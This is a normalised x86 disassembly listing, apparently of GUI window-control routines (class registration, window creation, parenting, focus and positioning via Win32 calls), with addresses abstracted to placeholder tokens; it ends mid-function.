cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44bfb7
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov al 0x1
call sub_44bd14
pop ecx
push ebp
mov al 0x2
call sub_44bd14
pop ecx
push ebp
mov al 0x3
call sub_44bd14
pop ecx
push ebp
mov al 0x4
call sub_44bd14
pop ecx
push ebp
mov al 0x5
call sub_44bd14
pop ecx
push ebp
mov al 0x6
call sub_44bd14
pop ecx
push ebp
xor eax eax
call sub_44bd14
pop ecx
mov eax [ ebp - 0x4 ]
mov si 0xffc7
call sub_403324
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403128
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x17c ] 0x0
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov si 0xffee
call sub_403324
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x17c ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x2c ]
sub_44bfdc
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44fadc
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x160 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44c070
xor eax eax
push ebp
push sub_44c063
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x90 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_44c078
retn
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x10
jmp r-xdata
sub_44c0a0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44c165
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4489b0
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
call sub_44c508
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44c16c
mov eax [ ebp - 0xc ]
call sub_403128
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44c4cc
mov edx eax
mov eax [ ebp - 0xc ]
call sub_4185a4
mov edx [ ebp - 0x8 ]
sub edx [ edi + 0x48 ]
sub edx [ edi + 0x40 ]
mov eax edi
call sub_4486f4
push 0x0
mov edx esi
mov eax [ ebp - 0xc ]
call sub_418700
xor ecx ecx
mov edx 0xb03e
call sub_44a198
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44c4cc
mov edi eax
mov eax [ edi + 0x4 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x4 ]
jne r-xdata
sub_44c174
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44c508
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_44c070
xor edx edx
push ebp
push sub_44c25b
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_44c508
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffc0
call sub_403324
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
jmp r-xdata
inc edi
xor ebx ebx
mov eax [ ebp - 0xc ]
mov ebx [ eax + 0x8 ]
test ebx ebx
jg r-xdata
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44c4cc
mov edx eax
mov eax [ ebp - 0xc ]
call sub_4185a4
mov edx ebx
dec edx
mov eax [ ebp - 0xc ]
call sub_418700
cmp [ eax + 0x5b ] 0x3
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_403128
mov eax [ ebp - 0x4 ]
call sub_44c078
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44c4cc
mov al [ eax + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
mov dl 0x3
call sub_448498
mov dl 0x4
call sub_448498
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x8 ]
dec edx
mov eax [ ebp - 0xc ]
call sub_4185f0
sub_44c2c8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_4607d8
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov ecx ebx
mov edx esi
call sub_4644fc
sub_44c2e8
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
lea eax [ esi + 0x198 ]
mov edx ebx
call sub_447878
lea eax [ esi + 0x19c ]
mov edx ebx
call sub_447878
lea eax [ esi + 0x194 ]
mov edx ebx
call sub_447878
jmp r-xdata
mov [ ebx + 0x30 ] esi
sub_44c334
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
lea eax [ esi + 0x198 ]
mov edx ebx
call sub_4478a0
lea eax [ esi + 0x194 ]
mov edx ebx
call sub_4478a0
lea eax [ esi + 0x19c ]
mov edx ebx
call sub_4478a0
jmp r-xdata
xor eax eax
mov [ ebx + 0x30 ] eax
pop esi
pop ebx
retn
sub_44c37c
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx edi
mov eax ebx
mov si 0xfff5
call sub_403324
push 0x1
mov esi ebx
mov ecx esi
mov edx 0xb02c
mov eax edi
call sub_44a198
mov edx ebx
mov eax edi
call sub_44c2e8
test [ ebx + 0x1c ] 0x2
jne r-xdata
push 0x1
mov ecx esi
mov edx 0xb036
mov eax edi
call sub_44a198
pop edi
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax ebx
call sub_44a198
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax ebx
call sub_44a198
push 0x0
xor ecx ecx
mov edx 0xb023
mov eax ebx
call sub_44a198
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_44a198
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax edi
call sub_44fadc
test al al
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb011
mov eax ebx
call sub_44a198
mov eax edi
call sub_44cecc
jmp r-xdata
mov edx ebx
mov eax edi
call sub_44bfdc
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_44c450
push ebx
push esi
push edi
push ebp
mov ebx edx
mov esi eax
push 0x0
mov edi ebx
mov ecx edi
mov edx 0xb036
mov eax esi
call sub_44a198
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax esi
call sub_44fadc
test al al
je r-xdata
mov dl 0x1
mov ebp ebx
mov eax ebp
call sub_44c2c8
mov eax ebp
call sub_44cd30
jmp r-xdata
mov edx ebx
mov eax esi
call sub_44c334
push 0x0
mov ecx edi
mov edx 0xb02c
mov eax esi
call sub_44a198
mov eax esi
call sub_44c098
pop ebp
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_4493f4
sub_44c4cc
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebx eax
mov ebp [ ebx + 0x198 ]
test ebp ebp
je r-xdata
xor esi esi
mov esi [ ebp + 0x8 ]
jmp r-xdata
mov edx edi
sub edx esi
mov eax [ ebx + 0x19c ]
call sub_418700
mov edx edi
mov eax ebp
call sub_418700
jmp r-xdata
cmp esi edi
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
sub_44c528
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov [ esp ] eax
mov eax [ esp ]
call sub_44c508
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ esp ]
call sub_44c4cc
mov ebp eax
mov edx esi
mov eax [ ebp + 0x3c ]
call [ ebp + 0x38 ]
cmp [ esi + 0xc ] 0x0
jne r-xdata
sub_44c568
add esp 0xfffffff0
movzx edx dx
mov [ esp ] edx
xor edx edx
mov [ esp + 0x4 ] edx
xor edx edx
mov [ esp + 0x8 ] edx
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
call sub_44c528
add esp 0x10
retn
sub_44c590
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ ebx + 0x34 ]
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ rw-data ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
mov [ ebx + 0x34 ] edi
mov eax [ ebx + 0x24 ]
and eax 0xffffbf1f
or eax 0x3
mov [ ebx + 0x24 ] eax
lea eax [ ebx + 0x24 ]
push eax
push esi
push 0x0
call GetClassInfoA
test eax eax
jne r-xdata
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ ebx + 0x34 ]
push eax
call GetClassInfoA
sub_44c5fc
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
call sub_449628
test al al
je r-xdata
mov eax ebx
call sub_449658
test al al
je r-xdata
or [ edi ] 0x2000
mov eax ebx
mov si 0xffc8
call sub_403324
test al al
je r-xdata
or [ edi ] 0x4000
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffca
call sub_403324
test al al
jne r-xdata
mov eax ebx
mov si 0xffca
call sub_403324
cmp al 0x1
jne r-xdata
or [ edi ] 0x1000
jmp r-xdata
or [ edi ] 0x0
sub_44c664
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_44c782
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
xor ecx ecx
mov edx 0x8c
call sub_402b34
mov eax [ esi + 0x64 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] 0x44000000
lea edx [ ebx + 0x8 ]
mov eax esi
call sub_44c5fc
test [ esi + 0x50 ] 0x1
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
or [ ebx + 0x4 ] 0x2000000
or [ ebx + 0x8 ] 0x10000
cmp [ esi + 0x1a4 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax [ esi + 0x40 ]
mov [ ebx + 0xc ] eax
mov eax [ esi + 0x44 ]
mov [ ebx + 0x10 ] eax
mov eax [ esi + 0x48 ]
mov [ ebx + 0x14 ] eax
mov eax [ esi + 0x4c ]
mov [ ebx + 0x18 ] eax
mov edi [ esi + 0x30 ]
test edi edi
je r-xdata
or [ ebx + 0x4 ] 0x10000
or [ ebx + 0x4 ] 0x8000000
mov eax [ esi + 0x190 ]
mov [ ebx + 0x1c ] eax
mov eax edi
call sub_44f7d8
mov [ ebx + 0x1c ] eax
jmp r-xdata
mov [ ebx + 0x24 ] 0xb
mov eax DefWindowProcA
mov [ ebx + 0x28 ] eax
push 0x7f00
push 0x0
call LoadCursorA
mov [ ebx + 0x3c ] eax
xor eax eax
mov [ ebx + 0x40 ] eax
mov eax [ rw-data ]
mov [ ebx + 0x34 ] eax
lea edx [ ebp - 0x104 ]
mov eax [ esi ]
call sub_403078
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_40411c
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x4c ]
call sub_408904
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44c789
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
sub_44c790
push ebp
mov ebp esp
add esp 0xffffff40
push ebx
push esi
xor edx edx
mov [ ebp - 0xc0 ] edx
mov esi eax
xor eax eax
push ebp
push sub_44c951
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x98 ]
cmp [ ebp - 0x70 ] 0x0
jne r-xdata
mov eax [ ebp - 0x64 ]
mov [ esi + 0x174 ] eax
lea eax [ ebp - 0xb4 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x58 ]
push eax
call GetClassInfoA
cmp eax 0x1
sbb eax eax
inc eax
test al al
je r-xdata
test [ ebp - 0x85 ] 0x40
je r-xdata
test al al
je r-xdata
mov edx sub_445d20
cmp edx [ ebp - 0xb0 ]
je r-xdata
mov ebx [ esi + 0x4 ]
test ebx ebx
je r-xdata
mov [ ebp - 0x64 ] sub_445d20
lea eax [ ebp - 0x40 ]
mov [ ebp - 0x44 ] eax
lea eax [ ebp - 0x68 ]
push eax
call RegisterClassA
test ax ax
jne r-xdata
mov eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call UnregisterClassA
mov [ rw-data ] esi
lea edx [ ebp - 0x8c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x9c ]
cmp [ esi + 0x180 ] 0x0
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0xbc ] eax
mov [ ebp - 0xb8 ] 0xb
lea eax [ ebp - 0xbc ]
push eax
push 0x0
lea edx [ ebp - 0xc0 ]
mov eax [ rw-data ]
call sub_405c78
mov ecx [ ebp - 0xc0 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b838
call sub_4038f4
test [ ebx + 0x1c ] 0x2
je r-xdata
call sub_40cdc0
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
call sub_40cdc0
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax [ esi + 0x64 ]
call sub_408ab8
xor eax eax
mov [ esi + 0x64 ] eax
mov eax esi
call sub_44fae8
push 0x1
mov eax [ esi + 0x68 ]
call sub_424280
mov ecx eax
mov edx 0x30
mov eax esi
call sub_44a198
cmp [ esi + 0x5c ] 0x0
je r-xdata
push 0xfffffff4
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
test eax eax
jne r-xdata
mov eax ebx
call sub_44f7d8
mov [ ebp - 0x70 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44c958
lea eax [ ebp - 0xc0 ]
call sub_403eb8
retn
mov eax esi
mov si 0xffee
call sub_403324
mov eax [ esi + 0x180 ]
push eax
push 0xfffffff4
push eax
call SetWindowLongA
sub_44c960
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0xc ]
push eax
mov eax [ ebx + 0x10 ]
push eax
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
mov eax [ ebx + 0x1c ]
push eax
push 0x0
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebx + 0x20 ]
push eax
mov ecx [ ebx ]
lea edx [ ebx + 0x4c ]
mov eax [ ebx + 0x8 ]
call sub_406bb8
mov [ esi + 0x180 ] eax
pop esi
pop ebx
retn
sub_44c9a0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41d03c
mov eax esi
call sub_41cf8c
mov [ ebx + 0x1fa ] eax
mov eax esi
call sub_41cf8c
mov [ ebx + 0x1fe ] eax
or [ ebx + 0x98 ] 0x20
mov eax esi
call sub_41d044
pop esi
pop ebx
retn
sub_44c9d8
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x8 ]
mov [ ebx + 0x1fa ] eax
mov eax [ esp + 0xc ]
mov [ ebx + 0x1fe ] eax
mov eax esi
call sub_41f270
mov edx [ ebx + 0x1fa ]
mov eax esi
call sub_41f1a4
mov edx [ ebx + 0x1fe ]
mov eax esi
call sub_41f1a4
mov eax esi
call sub_41f278
add esp 0x10
pop esi
pop ebx
retn
sub_44ca40
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x198 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ ebx + 0x1fa ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0x1fa
call sub_44ca2c
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x19c ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ ebp - 0x1 ] 0x0
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al [ r-xdata ]
cmp al [ edi + 0x61 ]
jne r-xdata
inc esi
dec ebx
jne r-xdata
mov al [ r-xdata ]
cmp al [ edi + 0x61 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x198 ]
mov edx esi
call sub_418700
mov edi eax
cmp [ edi + 0x5b ] 0x0
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_418700
mov edi eax
cmp [ edi + 0x5b ] 0x0
jne r-xdata
sub_44cb18
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_44a4d0
mov eax [ ebp - 0x8 ]
push eax
push sub_44c9a0
mov eax [ ebp - 0x8 ]
push eax
push sub_44c9d8
push ebp
call sub_44ca40
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44cb74
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_448f20
mov esi eax
cmp esi 0x1
jge r-xdata
lea eax [ esi + 0x1 ]
call sub_408a6c
mov edi eax
mov [ ebx + 0x64 ] edi
mov eax edi
call sub_408a80
mov ecx eax
mov edx edi
mov eax ebx
call sub_448f30
mov eax r-xdata
call sub_408a8c
mov [ ebx + 0x64 ] eax
jmp r-xdata
call sub_4479ac
mov eax ebx
mov edx [ eax ]
call [ edx + 0xac ]
pop edi
pop esi
pop ebx
retn
sub_44cbcc
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x200
xor eax eax
push ebp
push sub_44cc19
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x180 ]
push eax
call DestroyWindow
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44cc20
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xfdff
retn
call sub_40cdc0
sub_44cc30
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax [ edi + 0x19c ]
mov edx ebx
call sub_41875c
mov esi eax
inc esi
mov eax [ edi + 0x19c ]
mov ebx [ eax + 0x8 ]
dec ebx
sub ebx esi
jl r-xdata
xor eax eax
inc ebx
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x19c ]
mov edx esi
call sub_418700
mov eax [ eax + 0x180 ]
test eax eax
jne r-xdata
sub_44cc78
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xa0 ]
mov esi ebx
push esi
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetPropA
push esi
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetPropA
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
mov eax ebx
call sub_44c508
mov esi eax
dec esi
test esi esi
jl r-xdata
push 0x13
push 0x0
push 0x0
push 0x0
push 0x0
mov edx ebx
mov eax esi
call sub_44cc30
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_44c4cc
call sub_4485d8
inc edi
dec esi
jne r-xdata
sub_44cd14
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x14
sub_44cd30
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x19c ]
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xb0 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x19c ]
call sub_418700
call sub_44cd30
inc edi
dec esi
jne r-xdata
sub_44cd90
push ebx
push esi
push edi
mov edi eax
mov eax edi
mov si 0xffb5
call sub_403324
mov ebx eax
mov eax edi
call sub_44cd30
mov eax edi
call sub_44cecc
test bl bl
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x180 ] 0x0
je r-xdata
mov eax [ edi + 0x180 ]
push eax
call SetFocus
sub_44cdd0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x180 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x180 ] 0x0
jne r-xdata
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1a6 ]
cmp al [ ebp - 0x5 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x94 ]
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0x1a6 ] dl
xor eax eax
push ebp
push sub_44cea6
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
xor ecx ecx
mov edx 0xb019
mov eax [ ebp - 0x4 ]
call sub_44a198
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_418700
call sub_44cdd0
inc esi
dec ebx
jne r-xdata
sub_44cecc
push ebx
push esi
mov esi eax
mov ebx esi
jmp r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
jne r-xdata
mov ebx eax
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_44cdd0
cmp [ ebx + 0x190 ] 0x0
je r-xdata
sub_44cf0c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp esi [ ebx + 0x190 ]
je r-xdata
cmp [ ebx + 0x180 ] 0x0
je r-xdata
mov eax ebx
call sub_44cd30
mov [ ebx + 0x190 ] esi
cmp [ ebx + 0x190 ] 0x0
je r-xdata
test esi esi
je r-xdata
mov [ ebx + 0x190 ] esi
push esi
mov eax [ ebx + 0x180 ]
push eax
call SetParent
mov eax [ rw-data ]
cmp [ eax ] 0x5
jl r-xdata
mov eax ebx
call sub_44cecc
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
push 0x0
mov dx 0x3
mov ax 0x3
call sub_406ba8
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_44a198
jmp r-xdata
sub_44cf94
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44cfec
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_44cfdb
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44cfe2
call sub_4479ac
call sub_428654
retn
sub_44d00c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x4 ]
sub edx [ ebx + 0x44 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
sub eax [ ebx + 0x40 ]
call sub_417088
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ eax - 0xc ] edx
mov edx [ ebp - 0x4 ]
mov [ eax - 0x8 ] edx
mov eax [ ebp + 0x8 ]
push [ eax - 0x8 ]
push [ eax - 0xc ]
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x18 ]
push eax
call PtInRect
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
test al al
je r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] ebx
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov al 0x1
test [ ebx + 0x51 ] 0x4
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xfffffff4
call sub_406b90
push eax
xor ecx ecx
mov edx 0xb00a
mov eax ebx
call sub_44a198
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xd ] 0x0
je r-xdata
sub_44d0c4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0xd ] cl
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
mov [ ebp - 0x14 ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x198 ]
test eax eax
je r-xdata
cmp [ esi + 0x19c ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov eax [ esi + 0x19c ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
push ebp
mov edx ebx
